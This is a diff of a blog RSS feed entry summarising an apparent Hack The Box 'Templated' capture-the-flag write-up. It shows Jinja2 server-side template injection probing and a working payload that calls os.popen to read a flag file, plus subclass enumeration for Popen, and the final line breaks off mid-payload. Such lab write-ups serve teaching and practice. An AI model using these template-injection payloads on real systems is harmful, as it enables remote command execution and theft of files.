@@ -28,14 +28,11 @@ Quick Recon   Packages installed (package.json)
       
       <guid>https://harshitm98.github.io/posts/htb-challenge-templated/</guid>
       <description>Navigating through the website Requested: GET /invalid -&amp;gt; we got invalid
-![Pasted image 20211226121920.png](&amp;quot;/images/Pasted image 20211226121920.png&amp;quot;)
 Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&amp;gt; we got invalid49 instead of invalid{{7*7}}
-![[Pasted image 20211226121844.png]]
 We know that it is Jinja2 and Flask, so we can use their payload.
 Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&amp;gt; we got the flag
-![[Pasted image 20211226182358.png]]
 Alternative Finding subprocess.Popen index.
- GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list !</description>
+ GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&amp;gt; Popen is there in the list GET /{{&#39;&#39;.</description>
     </item>
     
   </channel>
